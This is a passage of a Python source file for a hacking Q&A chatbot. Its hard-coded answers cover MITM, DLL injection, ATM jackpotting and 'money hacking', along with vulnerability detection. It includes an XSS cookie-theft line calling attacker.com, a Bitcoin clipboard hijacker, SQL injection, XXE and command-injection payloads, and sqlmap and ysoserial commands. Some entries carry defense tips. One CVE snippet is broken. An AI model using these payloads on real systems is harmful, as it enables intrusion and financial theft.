                                       f"{Colors.YELLOW}  • Sniffing (on unencrypted HTTP traffic using Wireshark, tcpdump)\n"
                                       f"  • Cross-Site Scripting (XSS) to steal cookies\n"
                                       f"  • Man-in-the-Middle attacks (e.g., with Ettercap or Bettercap)\n"
                                       f"  • Session fixation and prediction attacks\n\n"
                                       f"{Colors.GREEN}• Example (Basic cookie theft using XSS):{Colors.END}\n"
                                       f"{Colors.YELLOW}  <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>\n\n"
                                       f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                       f"{Colors.YELLOW}  • Use HTTPS everywhere to encrypt sessions.\n"
                                       f"  • Use HttpOnly and Secure cookie flags.\n"
                                       f"  • Implement short session expiration times.\n"
                                       f"  • Use token regeneration after login.\n"
                                       f"  • Monitor session anomalies (IP change, location shifts).\n\n"
                                       f"{Colors.CYAN}Note:{Colors.END} Only use session hijacking techniques in ethical hacking environments. Unauthorized use is illegal and unethical.",

 

            "how to hack using mitm attacks": f"{Colors.CYAN}How To Hack Using MITM Attacks:{Colors.END}\n"
                                  f"{Colors.GREEN}• Description:{Colors.END} A Man-in-the-Middle (MITM) attack occurs when a malicious actor intercepts communication between two parties to eavesdrop, manipulate, or impersonate one of them.\n\n"
                                  f"{Colors.GREEN}• How It Works:{Colors.END}\n"
                                  f"{Colors.YELLOW}  1. Attacker positions themselves between two communicating systems.\n"
                                  f"  2. Intercepts or relays traffic while possibly altering or capturing sensitive data.\n"
                                  f"  3. Can be done on public Wi-Fi, local LANs, or using spoofing tools.\n\n"
                                  f"{Colors.GREEN}• Common Methods:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • ARP Spoofing (e.g., with Bettercap, Ettercap)\n"
                                  f"  • DNS Spoofing (fake DNS replies to redirect users)\n"
                                  f"  • SSL Stripping (downgrading HTTPS to HTTP)\n"
                                  f"  • Wi-Fi Evil Twin access points\n\n"
                                  f"{Colors.GREEN}• Example (Bettercap ARP spoofing):{Colors.END}\n"
                                  f"{Colors.YELLOW}  bettercap -iface wlan0\n"
                                  f"  set arp.spoof.targets 192.168.1.10\n"
                                  f"  arp.spoof on\n"
                                  f"  net.sniff on\n\n"
                                  f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Use HTTPS and VPNs at all times.\n"
                                  f"  • Enable dynamic ARP inspection on switches.\n"
                                  f"  • Use static ARP entries for critical systems.\n"
                                  f"  • Monitor network anomalies.\n\n"
                                  f"{Colors.CYAN}Note:{Colors.END} This technique should only be performed in penetration testing labs or environments with clear authorization. Unauthorized use is illegal.",


 


            "how to hack using mitb attacks": f"{Colors.CYAN}How To Hack Using Man-in-the-Browser (MitB) Attacks:{Colors.END}\n"
                                  f"{Colors.GREEN}• Description:{Colors.END} A Man-in-the-Browser (MitB) attack is a type of malware-based attack where an attacker injects malicious code into a victim’s web browser to intercept or manipulate transactions.\n\n"
                                  f"{Colors.GREEN}• How It Works:{Colors.END}\n"
                                  f"{Colors.YELLOW}  1. Victim is infected with malware (often via phishing or malicious downloads).\n"
                                  f"  2. The malware hooks into the browser’s APIs.\n"
                                  f"  3. As the user interacts with web applications (e.g. banking), the attacker silently alters requests/responses.\n"
                                  f"  4. Transactions may be redirected or modified in real time without user awareness.\n\n"
                                  f"{Colors.GREEN}• Common Use Cases:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Online banking fraud\n"
                                  f"  • Session hijacking\n"
                                  f"  • Credential harvesting\n\n"
                                  f"{Colors.GREEN}• Example Attack Flow:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Malware (like Zeus, SpyEye) is installed on victim.\n"
                                  f"  • Browser hook intercepts login form.\n"
                                  f"  • Attacker captures login credentials silently.\n"
                                  f"  • Attacker modifies transfer details without user seeing.\n\n"
                                  f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Use updated anti-malware tools with browser protection.\n"
                                  f"  • Employ secure two-factor authentication.\n"
                                  f"  • Monitor transactions using out-of-band communication (e.g. SMS alert confirmation).\n"
                                  f"  • Harden browsers via extensions and runtime protection.\n\n"
                                  f"{Colors.CYAN}Note:{Colors.END} MitB attacks are stealthy and hard to detect. Ethical usage in malware research or red teaming requires explicit consent and isolated environments.",

 

            "how to hack using dll injection": f"{Colors.CYAN}How To Hack Using DLL Injection:{Colors.END}\n"
                                   f"{Colors.GREEN}• Description:{Colors.END} DLL Injection is a technique used to run arbitrary code within the address space of another process by forcing it to load a Dynamic Link Library (DLL).\n\n"
                                   f"{Colors.GREEN}• How It Works:{Colors.END}\n"
                                   f"{Colors.YELLOW}  1. Attacker writes or uses a malicious DLL with specific payload.\n"
                                   f"  2. The attacker identifies the target process (e.g., explorer.exe, notepad.exe).\n"
                                   f"  3. Uses Windows API functions to inject the DLL into that process (e.g., using CreateRemoteThread).\n"
                                   f"  4. Once injected, the malicious code runs in the context of the target process.\n\n"
                                   f"{Colors.GREEN}• Common API Functions Used:{Colors.END}\n"
                                   f"{Colors.YELLOW}  • OpenProcess()\n"
                                   f"  • VirtualAllocEx()\n"
                                   f"  • WriteProcessMemory()\n"
                                   f"  • CreateRemoteThread()\n\n"
                                   f"{Colors.GREEN}• Example Injection Flow (Simplified):{Colors.END}\n"
                                   f"{Colors.YELLOW}  1. Get handle to target process (PID).\n"
                                   f"  2. Allocate memory for DLL path in target.\n"
                                   f"  3. Write DLL path into target memory.\n"
                                   f"  4. Use CreateRemoteThread to call LoadLibraryA and load the DLL.\n\n"
                                   f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                   f"{Colors.YELLOW}  • Enable DLL signing and validation.\n"
                                   f"  • Use EDR systems to monitor suspicious memory injections.\n"
                                   f"  • Limit unnecessary privileges and process access rights.\n"
                                   f"  • Monitor use of suspicious WinAPI calls.\n\n"
                                   f"{Colors.CYAN}Note:{Colors.END} DLL Injection is heavily used by malware and game cheats. Use only in ethical red team operations or controlled lab research. Unauthorized use is illegal and unethical.",

 


            "how to hack mobile apps and games": f"{Colors.CYAN}How To Hack Mobile Apps and Games (APK Decompiling, Frida):{Colors.END}\n"
                                    f"{Colors.GREEN}• Description:{Colors.END} Techniques to analyze, modify, and manipulate Android APKs and mobile apps using reverse engineering tools like APKTool, JADX, and dynamic instrumentation frameworks like Frida.\n\n"
                                    f"{Colors.GREEN}• Key Tools:{Colors.END}\n"
                                    f"{Colors.YELLOW}  • APKTool: For decompiling and recompiling APK resources.\n"
                                    f"  • JADX: For decompiling APK bytecode to readable Java source.\n"
                                    f"  • Frida: Dynamic instrumentation toolkit for hooking and modifying app behavior at runtime.\n\n"
                                    f"{Colors.GREEN}• Common Steps for APK Analysis:{Colors.END}\n"
                                    f"{Colors.YELLOW}  1. Obtain APK file from device or Play Store.\n"
                                    f"  2. Use APKTool to decode resources and manifest:\n"
                                    f"     apktool d appname.apk\n"
                                    f"  3. Use JADX to view decompiled Java code for logic analysis.\n"
                                    f"  4. Identify sensitive functions like license checks, API keys, or in-app purchase validations.\n\n"
                                    f"{Colors.GREEN}• Using Frida for Dynamic Analysis:{Colors.END}\n"
                                    f"{Colors.YELLOW}  • Attach Frida to a running app process:\n"
                                    f"    frida -n com.example.app\n"
                                    f"  • Inject JavaScript hooks to intercept function calls or modify return values.\n"
                                    f"  • Example Frida script to bypass root detection or tamper checks.\n\n"
                                    f"{Colors.GREEN}• Example Frida Hook (JavaScript):{Colors.END}\n"
                                    f"{Colors.YELLOW}  Java.perform(function () {{\n"
                                    f"    var targetClass = Java.use('com.example.app.SecurityManager');\n"
                                    f"    targetClass.isDeviceRooted.implementation = function () {{\n"
                                    f"      return false;  // Bypass root detection\n"
                                    f"    }};\n"
                                    f"  }});\n\n"
                                    f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                    f"{Colors.YELLOW}  • Use code obfuscation and encryption.\n"
                                    f"  • Implement runtime integrity and tamper checks.\n"
                                    f"  • Detect hooking frameworks and block execution.\n\n"
                                    f"{Colors.CYAN}Note:{Colors.END} These techniques are for educational and authorized security testing only. Unauthorized tampering with apps is illegal and unethical.",





    

            "how to hack atm": f"{Colors.CYAN}ATM Hacking Techniques:{Colors.END}\n"
                             f"{Colors.GREEN}• Skimming: Installing a card reader and hidden camera to capture card data and PINs{Colors.END}\n"
                             f"{Colors.GREEN}• Malware Injection: Using USB/CD to infect ATMs with malware like Ploutus, Cutlet Maker{Colors.END}\n"
                             f"{Colors.GREEN}• Jackpotting: Forcing the ATM to dispense all cash using hardware/software attacks{Colors.END}\n"
                             f"{Colors.GREEN}• Network Sniffing: Intercepting ATM-bank communication on insecure networks{Colors.END}\n"
                             f"{Colors.GREEN}• Physical Keypad Cloning: Replacing keypad to capture PINs directly{Colors.END}\n\n"
                             f"{Colors.CYAN}Examples of malicious code/tools used:{Colors.END}\n"
                             f"{Colors.GREEN}• ATM Malware Example (Ploutus): Infect via USB and trigger dispense via SMS or external command{Colors.END}\n"
                             f"{Colors.GREEN}• Cutlet Maker sample command:\n" 
                             f"  python cutletmaker.py --dispense 10000 --dry-run{Colors.END}\n"
                             f"{Colors.GREEN}• ATM network sniffing:\n"
                             f"  tshark -i eth0 -f 'tcp port 443' -w atm_traffic.pcap{Colors.END}\n"
                             f"{Colors.GREEN}• Hidden camera placement to capture PIN entry in real-time{Colors.END}\n"
                             f"{Colors.GREEN}• Use of Black Box attacks via cable access to ATM internals{Colors.END}",

 




            "how to hack money": f"{Colors.CYAN}Money Hacking Techniques:{Colors.END}\n"
                               f"{Colors.GREEN}• Online Banking Trojans: Malware like Zeus and Gozi used to steal banking credentials{Colors.END}\n"
                               f"{Colors.GREEN}• Payment Gateway Exploits: Intercepting or manipulating payment traffic (e.g., MITM attacks){Colors.END}\n"
                               f"{Colors.GREEN}• SIM Swap Fraud: Taking over someone's mobile number to hijack OTP-based financial accounts{Colors.END}\n"
                               f"{Colors.GREEN}• Carding: Using stolen credit card info to make unauthorized purchases{Colors.END}\n"
                               f"{Colors.GREEN}• Crypto Wallet Draining: Using clipboard hijackers and phishing to steal crypto keys{Colors.END}\n\n"
                               f"{Colors.CYAN}Examples of malicious code/tools used:{Colors.END}\n"
                               f"{Colors.GREEN}• Zeus Trojan (form grabber sample):\n"
                               f"  Injected HTML fields capture login+PIN\n"
                               f"  Exfiltrated via C2 server connection{Colors.END}\n"
                               f"{Colors.GREEN}• Clipboard Hijacker for Bitcoin addresses:\n"
                               f"  import pyperclip\n"
                               f"  if '1A1zP1' in pyperclip.paste(): pyperclip.copy('attacker_wallet'){Colors.END}\n"
                               f"{Colors.GREEN}• Python script for fake payment generator (educational use only):\n"
                               f"  print('Payment successful: Transaction ID 0xFAKE123') # visual trick only{Colors.END}\n"
                               f"{Colors.GREEN}• SIM Swap uses social engineering and SS7 protocol weaknesses to take control of 2FA SMS{Colors.END}"

}


        # NEW: Vulnerability Detection
        self.vulnerability_detection = {
            "how to find vulnerabilities": f"{Colors.CYAN}🔍 Vulnerability Discovery Methods:{Colors.END}\n"
                                 f"{Colors.GREEN}• Conduct automated vulnerability scans using tools like Nessus, OpenVAS, or Nikto.{Colors.END}\n"
                                 f"{Colors.GREEN}• Perform manual code reviews to uncover logic flaws, insecure coding practices, and hardcoded credentials.{Colors.END}\n"
                                 f"{Colors.GREEN}• Use Static Application Security Testing (SAST) to analyze source code for vulnerabilities without executing it.{Colors.END}\n"
                                 f"{Colors.GREEN}• Implement Dynamic Application Security Testing (DAST) to detect runtime vulnerabilities like XSS and SQLi during live testing.{Colors.END}\n"
                                 f"{Colors.RED}• Monitor public vulnerability feeds such as CVE databases, NVD (nvd.nist.gov), and vendor security bulletins.{Colors.END}\n"
                                 f"{Colors.YELLOW}🔧 Example: Using Python to check for outdated software via CVE API:{Colors.END}\n\n"
                                 f"{Colors.CYAN}import requests\n"
                                 f"package = 'nginx'\n"
                                 f"url = f'https://cve.circl.lu/api/search/{{package}}'\n"
                                 f"response = requests.get(url).json()\n"
                                 f"for cve in response.get('data', []):\n"
                                 f"# Output: Lists vulnerabilities related to 'nginx'{Colors.END}",

            
            

    
        
            "how to identify sql injection": f"{Colors.CYAN}💉 SQL Injection Detection Techniques:{Colors.END}\n"
                               f"{Colors.GREEN}• Test user input fields (e.g., login, search) with special characters such as `'`, `--`, `;`, and observe the behavior.{Colors.END}\n"
                               f"{Colors.GREEN}• Look for SQL error messages like 'You have an error in your SQL syntax' or 'Unclosed quotation mark'.{Colors.END}\n"
                               f"{Colors.GREEN}• Use time-based blind injections such as `' OR IF(1=1, SLEEP(5), 0) -- '` and measure response time.{Colors.END}\n"
                               f"{Colors.RED}• Leverage automated tools like sqlmap to detect and exploit SQL injection points with precision.{Colors.END}\n"
                               f"{Colors.YELLOW}💡 Example SQL Payloads:{Colors.END}\n"
                               f"{Colors.CYAN}    ' OR '1'='1' -- \n"
                               f"    admin'-- \n"
                               f"    ' OR SLEEP(5) -- \n"
                               f"{Colors.YELLOW}🧪 Example usage of sqlmap (command-line):{Colors.END}\n"
                               f"{Colors.CYAN}    sqlmap -u \"http://example.com/page.php?id=1\" --risk=3 --level=5 --batch --dump{Colors.END}",                             
                                          
            
            



            "how to detect xml external entity (xxe) vulnerabilities": f"{Colors.MAGENTA}XXE Vulnerability Detection:{Colors.END}\n"
                               f"{Colors.GREEN}• What is XXE?{Colors.END} XML External Entity (XXE) is a vulnerability that allows an attacker to interfere with the processing of XML data.\n"
                               f"{Colors.GREEN}• Impact:{Colors.END} XXE can lead to exposure of internal files, SSRF, denial of service, or even remote code execution in extreme cases.\n"
                               f"{Colors.GREEN}• How It Works:{Colors.END} The attacker defines a malicious external entity within XML input that gets parsed by a vulnerable XML processor.\n"
                               f"{Colors.CYAN}Example XXE Payload:{Colors.END}\n"
                               f"{Colors.YELLOW}<?xml version=\"1.0\"?>\n"
                               f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
                               f"<foo>&xxe;</foo>{Colors.END}\n"
                               f"{Colors.GREEN}• Detection Techniques:{Colors.END}\n"
                               f"  1. Use BurpSuite with XXE payloads on XML-based inputs (especially REST/SOAP APIs).\n"
                               f"  2. Fuzz XML parameters using tools like OWASP ZAP, XXEinjector, or custom scripts.\n"
                               f"  3. Manually inspect responses that include suspicious file content or error messages.\n"
                               f"{Colors.GREEN}• Testing With Python Script:{Colors.END}\n"
                               f"{Colors.CYAN}import requests\n"
                               f"url = 'http://target.com/xml'\n"
                               f"payload = '''<?xml version=\"1.0\"?>\n"
                               f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
                               f"<foo>&xxe;</foo>'''\n"
                               f"headers = {{'Content-Type': 'application/xml'}}\n"
                               f"res = requests.post(url, data=payload, headers=headers)\n"
                               f"if '/root:' in res.text:\n"
                               f"    print('Potential XXE vulnerability found!')\n"
                               f"else:\n"
                               f"    print('No XXE detected')\n"
                               f"{Colors.GREEN}• Mitigation (Defensive Knowledge):{Colors.END}\n"
                               f"  - Disable DTD processing in all XML parsers.\n"
                               f"  - Use whitelisting or JSON-based parsers when possible.\n"
                               f"  - Use SAST/DAST tools to scan for XXE issues automatically.\n"
                               f"{Colors.RED}• Legal Note:{Colors.END} XXE testing should only be performed on systems you are authorized to assess.\n",





            "how to find server-side request forgery (ssrf)": f"{Colors.MAGENTA}SSRF Vulnerability Detection:{Colors.END}\n"
                               f"{Colors.GREEN}• What is SSRF?{Colors.END} Server-Side Request Forgery is a vulnerability that allows attackers to make the server send requests on their behalf to internal or external systems.\n"
                               f"{Colors.GREEN}• Impact:{Colors.END} SSRF can lead to internal network scanning, access to cloud metadata services, or even Remote Code Execution.\n"
                               f"{Colors.GREEN}• Typical SSRF Targets:{Colors.END}\n"
                               f"  - Internal services (127.0.0.1, localhost, 169.254.169.254)\n"
                               f"  - AWS/GCP/Azure metadata APIs\n"
                               f"  - Redis/ElasticSearch ports\n"
                               f"{Colors.GREEN}• Common Injection Points:{Colors.END} URL parameters like `url=`, `path=`, `redirect=`, `image=`, `link=`, etc.\n"
                               f"{Colors.CYAN}Example Payloads:{Colors.END}\n"
                               f"{Colors.YELLOW}http://target.com/fetch?url=http://127.0.0.1:80\n"
                               f"http://target.com/image?url=http://169.254.169.254/latest/meta-data/{Colors.END}\n"
                               f"{Colors.GREEN}• Detection Techniques:{Colors.END}\n"
                               f"  1. Use BurpSuite to intercept and modify URLs to point to internal IPs.\n"
                               f"  2. Monitor for time delays or sensitive information in response (metadata keys).\n"
                               f"  3. Use external request bin (e.g., webhook.site) to confirm outbound SSRF from target.\n"
                               f"{Colors.GREEN}• Python Detection Script Example:{Colors.END}\n"
                               f"{Colors.CYAN}import requests\n"
                               f"url = 'http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/'\n"
                               f"res = requests.get(url)\n"
                               f"if 'ami-id' in res.text or 'hostname' in res.text:\n"
                               f"    print('Possible SSRF vulnerability found!')\n"
                               f"else:\n"
                               f"    print('No SSRF detected')\n"
                               f"{Colors.GREEN}• Advanced Detection:{Colors.END} Try DNS-based SSRF detection via public DNS loggers (e.g., Burp Collaborator).\n"
                               f"{Colors.GREEN}• Mitigation (For Defense):{Colors.END}\n"
                               f"  - Whitelist allowed domains and deny local IP ranges.\n"
                               f"  - Disable unnecessary outbound connections on the server.\n"
                               f"  - Validate and sanitize all user-supplied URLs.\n"
                               f"{Colors.RED}• Legal Notice:{Colors.END} SSRF tests must only be conducted on authorized infrastructure.\n",





            "how to detect command injection vulnerabilities": f"{Colors.MAGENTA}Command Injection Detection:{Colors.END}\n"
                               f"{Colors.GREEN}• What is Command Injection?{Colors.END} It’s a vulnerability where user input is improperly passed to system commands on the server, allowing attackers to execute arbitrary OS commands.\n"
                               f"{Colors.GREEN}• Impact:{Colors.END} Remote code execution, full system compromise, data exfiltration, lateral movement.\n"
                               f"{Colors.GREEN}• Common Vulnerable Parameters:{Colors.END} `ip=`, `host=`, `cmd=`, `ping=`, `dns=`, etc.\n"
                               f"{Colors.CYAN}Example Payloads:{Colors.END}\n"
                               f"{Colors.YELLOW}127.0.0.1; whoami\n"
                               f"8.8.8.8 && cat /etc/passwd\n"
                               f"1.1.1.1 || dir{Colors.END}\n"
                               f"{Colors.GREEN}• Detection Techniques:{Colors.END}\n"
                               f"  1. Use payloads that append OS commands (`;`, `&&`, `||`) and observe changes in output.\n"
                               f"  2. Use time-based detection: inject `sleep 5` and measure response delay.\n"
                               f"  3. Monitor system-level side effects (e.g., logs, file creation).\n"
                               f"{Colors.GREEN}• Sample Python Detection Script:{Colors.END}\n"
                               f"{Colors.CYAN}import requests\n"
                               f"url = 'http://target.com/ping?host=127.0.0.1;whoami'\n"
                               f"res = requests.get(url)\n"
                               f"if 'root' in res.text or 'admin' in res.text:\n"
                               f"    print('Possible Command Injection!')\n"
                               f"else:\n"
                               f"    print('No injection detected')\n"
                               f"{Colors.GREEN}• Advanced Detection:{Colors.END} Use Burp Intruder or Commix (automated tool for command injection testing).\n"
                               f"{Colors.GREEN}• Mitigation (For Defense):{Colors.END}\n"
                               f"  - Avoid calling OS commands from user input.\n"
                               f"  - Use secure APIs instead of shell execution.\n"
                               f"  - Sanitize and validate inputs strictly.\n"
                               f"{Colors.RED}• Legal Notice:{Colors.END} Only test on systems you own or have explicit permission to assess.\n",





            "how to detect insecure deserialization": f"{Colors.MAGENTA}Insecure Deserialization Detection:{Colors.END}\n"
                               f"{Colors.GREEN}• What is Insecure Deserialization?{Colors.END} A vulnerability that occurs when untrusted or user-controlled data is deserialized by an application, allowing attackers to modify serialized objects to execute arbitrary code or elevate privileges.\n"
                               f"{Colors.GREEN}• Impact:{Colors.END} Remote code execution, privilege escalation, authentication bypass.\n"
                               f"{Colors.GREEN}• Serialization Formats to Watch:{Colors.END} Java (binary/serialized), JSON, XML, YAML, PHP, .NET BinaryFormatter.\n"
                               f"{Colors.GREEN}• Common Signs of Risk:{Colors.END}\n"
                               f"   - Application accepts serialized objects in cookies, POST bodies, headers.\n"
                               f"   - Server responses include Base64 blobs or object data hints.\n"
                               f"   - Java stack traces mentioning ObjectInputStream, readObject, etc.\n"
                               f"{Colors.GREEN}• Manual Testing Tips:{Colors.END}\n"
                               f"   1. Modify or tamper with object content, e.g., change values or structures.\n"
                               f"   2. Inject malicious payloads using tools like `ysoserial` (for Java) or `PHPGGC` (for PHP).\n"
                               f"{Colors.GREEN}• Example Java Payload with ysoserial:{Colors.END}\n"
                               f"{Colors.CYAN}$ java -jar ysoserial.jar CommonsCollections1 'ping 127.0.0.1' > payload.ser{Colors.END}\n"
                               f"{Colors.GREEN}• Python Detection Pseudocode:{Colors.END}\n"
                               f"{Colors.CYAN}import base64, requests\n"
                               f"payload = base64.b64encode(b'malicious serialized object')\n"
                               f"cookies = {{'session': payload.decode()}}\n"
                               f"res = requests.get('http://target.com', cookies=cookies)\n"
                               f"if 'Exception' in res.text or 'Traceback' in res.text:\n"
                               f"    print('Potential insecure deserialization detected')\n"
                               f"{Colors.GREEN}• Automated Tools:{Colors.END} `Burp Suite Pro`, `ysoserial`, `PHPGGC`, `SerialSniper`.\n"
                               f"{Colors.GREEN}• Mitigation Tips (For Developers):{Colors.END}\n"
                               f"  - Never deserialize untrusted input.\n"
                               f"  - Use data format validators (e.g., JSON schema).\n"
                               f"  - Implement integrity checks like digital signatures.\n"
                               f"  - Use safe libraries with deserialization restrictions.\n"
                               f"{Colors.RED}• Legal Note:{Colors.END} This technique must be used only in penetration testing environments with permission.\n",


            "how to detect xss vulnerabilities": f"{Colors.CYAN}🚨 XSS Vulnerability Detection Guide:{Colors.END}\n"
                                   f"{Colors.GREEN}• Test user input fields by injecting benign JavaScript payloads such as <script>alert(1)</script>{Colors.END}\n"
                                   f"{Colors.GREEN}• Look for reflected XSS in URL parameters and search fields (appears in immediate response).{Colors.END}\n"
                                   f"{Colors.GREEN}• Identify stored XSS in comments, profile info, or forums (persistently saved on the server).{Colors.END}\n"
                                   f"{Colors.RED}• Analyze the page for DOM-based XSS, especially where JavaScript uses `innerHTML`, `eval()`, or `document.write()`.{Colors.END}\n"
                                   f"{Colors.YELLOW}💡 Common XSS Payloads:{Colors.END}\n"
                                   f"{Colors.CYAN}    <script>alert('XSS')</script>\n"
                                   f"    <img src=x onerror=alert('XSS')>\n"
                                   f"    <svg/onload=alert('XSS')>\n"
                                   f"{Colors.YELLOW}🧪 Tools for XSS Testing:{Colors.END}\n"
                                   f"{Colors.CYAN}    • XSStrike (context-aware XSS scanner)\n"
                                   f"    • Burp Suite (Pro has active scanner)\n"
                                   f"    • OWASP ZAP (automated XSS detection)\n"
                                   f"    • Manual testing via browser DevTools & request interception{Colors.END}",                               
                                              
            



        
            "how to find buffer overflow": f"{Colors.CYAN}Buffer Overflow Detection:{Colors.END}\n"
                                   f"{Colors.GREEN}• Use fuzzing techniques on inputs (e.g., AFL, Peach){Colors.END}\n"
                                   f"{Colors.GREEN}• Analyze memory allocation and unsafe functions like gets(), strcpy(){Colors.END}\n"
                                   f"{Colors.GREEN}• Test with oversized input to trigger segmentation faults{Colors.END}\n"
                                   f"{Colors.RED}• Monitor for memory corruption, crashes, or EIP overwrite in debuggers{Colors.END}\n"
                                   f"{Colors.YELLOW}• Example: Basic fuzzing in Python:{Colors.END}\n\n"
                                   f"{Colors.YELLOW}  import socket\n"
                                   f"  buffer = b'A' * 1000\n"
                                   f"  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                                   f"  s.connect(('TARGET_IP', PORT))\n"
                                   f"  s.send(buffer)\n"
                                   f"  s.close(){Colors.END}",

                                         
            
        
            "how to identify authentication bypass": f"{Colors.CYAN}Authentication Bypass Detection:{Colors.END}\n"
                                       f"{Colors.GREEN}• Test for default credentials like admin/admin or guest/guest{Colors.END}\n"
                                       f"{Colors.GREEN}• Look for weak session management (e.g., session fixation or predictable tokens){Colors.END}\n"
                                       f"{Colors.GREEN}• Check for privilege escalation by manipulating user roles in cookies or headers{Colors.END}\n"
                                       f"{Colors.RED}• Inspect password reset flows for IDOR (Insecure Direct Object Reference){Colors.END}\n"
                                       f"{Colors.YELLOW}• Example Code: Simple login bypass using manipulated headers:{Colors.END}\n\n"
                                       f"{Colors.YELLOW}  import requests\n"
                                       f"  url = 'http://target.com/dashboard'\n"
                                       f"  headers = {{'Cookie': 'auth=admin'}}  # Fake session cookie\n"
                                       f"  r = requests.get(url, headers=headers)\n"
                                       f"  print(r.text){Colors.END}",

                                                   
                                                   
            
        
            "how to detect insecure configurations": f"{Colors.CYAN}Insecure Configuration Detection:{Colors.END}\n"
                                   f"{Colors.GREEN}• Check for default credentials, open ports, or unused services running{Colors.END}\n"
                                   f"{Colors.GREEN}• Inspect configuration files for hardcoded secrets or weak encryption settings{Colors.END}\n"
                                   f"{Colors.GREEN}• Verify SSL/TLS configuration: Weak ciphers, expired certs, or insecure protocols (e.g., SSLv3, TLS 1.0){Colors.END}\n"
                                   f"{Colors.GREEN}• Audit file and directory permissions (e.g., 777 or world-writable folders){Colors.END}\n"
                                   f"{Colors.RED}• Review firewall rules and open network service exposure (e.g., SSH open to the world){Colors.END}\n"
                                   f"{Colors.RED}• Identify services running as root or with excessive privileges{Colors.END}\n"
                                   f"{Colors.YELLOW}• Recommended Tools: Nessus, OpenVAS, Lynis, Nikto, CIS-CAT{Colors.END}\n\n"
                                   f"{Colors.YELLOW}Example: Quick insecure configuration audit on Linux systems{Colors.END}\n"
                                   f"{Colors.YELLOW}-------------------------------------------------------------{Colors.END}\n"
                                   f"{Colors.YELLOW}#!/bin/bash\n"
                                   f"echo '[+] Checking for world-writable files:'\n"
                                   f"find / -type f -perm -0002 -ls 2>/dev/null\n\n"
                                   f"echo '[+] Checking for services running as root:'\n"
                                   f"ps aux | grep root\n\n"
                                   f"echo '[+] Checking for SSH open to all:'\n"
                                   f"netstat -tuln | grep ':22'\n\n"
                                   f"echo '[+] Checking for default config files:'\n"
                                   f"ls /etc | grep -i 'default' 2>/dev/null{Colors.END}"
}



    def show_banner(self):
        """Display the enhanced bot banner"""
        banner = f"""
{Colors.RED}CAUTION {Colors.END}
{Colors.YELLOW}This tool provides cybersecurity guidance for educational purposes.
Always follow your organization's security policies and consult professionals.{Colors.END}

{Colors.CYAN}{Colors.BOLD}------------------------------------------------------------------------------------------------------------------------------------{Colors.END}
{Colors.RED}{Colors.BOLD}         TERMITE - ENHANCED CYBERSECURITY BOT               {Colors.END}

{Colors.MAGENTA}{Colors.BOLD}         This script coded by matrix leons     {Colors.END}
{Colors.CYAN}{Colors.BOLD}------------------------------------------------------------------------------------------------------------------------------------{Colors.END}

___________                  .__  __          
\\__    ___/__________  _____ |__|/  |_  ____  
  |    |_/ __ \\_  __ \\/     \\|  \\   __\\/ __ \\ 
  |    |\\  ___/|  | \\/  Y Y  \\  ||  | \\  ___/ 
  |____| \\___  >__|  |__|_|  /__||__|  \\___  >
             \\/            \\/              \\/  


# GitHub  : https://github.com/matrixleons
# LinkedIn: matrix leons (on LinkedIn)
# Email   : matrixleons@gmail.com
"""
        print(banner)

    def show_help(self):
        """Display enhanced help information"""
        help_text = f"""
{Colors.GREEN}{Colors.BOLD}Available Commands:{Colors.END}
{Colors.RED}• help{Colors.END}                    - Show this help message
{Colors.RED}• categories{Colors.END}              - Show all question categories
{Colors.RED}• basic questions{Colors.END}         - Show basic security questions
{Colors.RED}• defense techniques{Colors.END}      - Show defense technique questions
{Colors.RED}• hacking techniques{Colors.END}      - Show hacking techniques questions
{Colors.RED}• malware scripts{Colors.END}         - Show malware scripts questions
{Colors.RED}• scanning tools{Colors.END}          - Show tool development questions
{Colors.RED}• vulnerabilities{Colors.END}         - Show vulnerability detection questions
{Colors.RED}• all questions{Colors.END}           - Show ALL available questions
{Colors.RED}• exit{Colors.END}                    - Exit the bot
{Colors.RED}• clear{Colors.END}                   - Clear screen

{Colors.GREEN}{Colors.BOLD}Categories:{Colors.END}
{Colors.RED} Basic Security{Colors.END}     - General cybersecurity practices
{Colors.RED} Defense Techniques{Colors.END} - Advanced defense strategies  
{Colors.RED} Hacking Techniques{Colors.END} - Advanced hacking strategies 
{Colors.RED} Malware Scripts{Colors.END} - Advanced malware scripting
{Colors.RED} Scanning Tools{Colors.END}     - Network and web scanning tools
{Colors.RED} Vulnerabilities{Colors.END}    - Vulnerability detection methods

{Colors.GREEN}{Colors.BOLD}Usage:{Colors.END}
Type your cybersecurity question and I'll provide guidance.
"""
        print(help_text)

    def show_categories(self):
        """Show question categories"""
        print(f"\n{Colors.GREEN}{Colors.BOLD}Question Categories:{Colors.END}")
        print(f"{Colors.CYAN}{'='*60}{Colors.END}")
        print(f"{Colors.BLUE} Basic Security Questions:{Colors.END} {len(self.questions_answers)} questions")
        print(f"{Colors.MAGENTA} Defense Techniques:{Colors.END} {len(self.defense_techniques)} questions")
        print(f"{Colors.MAGENTA} Hacking Techniques:{Colors.END} {len(self.hacking_techniques)} questions")
        print(f"{Colors.MAGENTA} Malware Scripts:{Colors.END} {len(self.Malware_scripts)} questions")
        print(f"{Colors.BLUE} Scanning Tools:{Colors.END} {len(self.scanning_tools)} questions")
        print(f"{Colors.CYAN} Vulnerability Detection:{Colors.END} {len(self.vulnerability_detection)} questions")
        print(f"{Colors.CYAN}{'='*60}{Colors.END}")
        total = (
            len(self.questions_answers) +
            len(self.defense_techniques) +
            len(self.hacking_techniques) +
            len(self.Malware_scripts) +
            len(self.scanning_tools) +
            len(self.vulnerability_detection)
        )
        print(f"{Colors.YELLOW}Total Questions Available: {total}{Colors.END}")

    def show_category_questions(self, category):
        """Show questions for specific category"""
        categories = {
            "basic": (self.questions_answers, "Basic Security Questions", Colors.BLUE),
            "defense": (self.defense_techniques, "Defense Techniques", Colors.MAGENTA),
